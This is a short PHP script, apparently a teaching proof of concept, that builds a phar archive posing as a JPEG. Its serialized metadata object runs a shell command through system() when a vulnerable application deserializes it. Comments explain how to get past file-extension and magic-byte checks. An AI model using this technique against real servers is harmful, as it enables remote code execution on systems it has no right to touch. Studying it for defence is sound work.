<?php

# this is usually an open source third party
# public code the hacker knows / guesses the app uses
# for instance, Laravel / Symfony are known to have POP chains
class SomeClassTheAppLoaded {
    public $data = null;
    public function __construct($data) { $this->data = $data; }
    public function __destruct() { system($this->data); }
}

# creating a profile.png does *not* work:
# Fatal error:
# Uncaught UnexpectedValueException:
# Cannot create phar 'profile.png'
# file extension (or combination) not recognised
#
# let's just hope the server doesn't check file suffixes ...
$phar = new Phar('profile.phar');
$phar->startBuffering();

# phar files with phar:// prefix
# have special semantics for the / after their name
# it looks for files inside the archive ...
$phar->addFromString('test.txt', 'text');

# have some magic bytes of image format
# just in case the server checks that ...
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$object = new SomeClassTheAppLoaded('uname -a > pwned');
$phar->setMetadata($object);
$phar->stopBuffering();
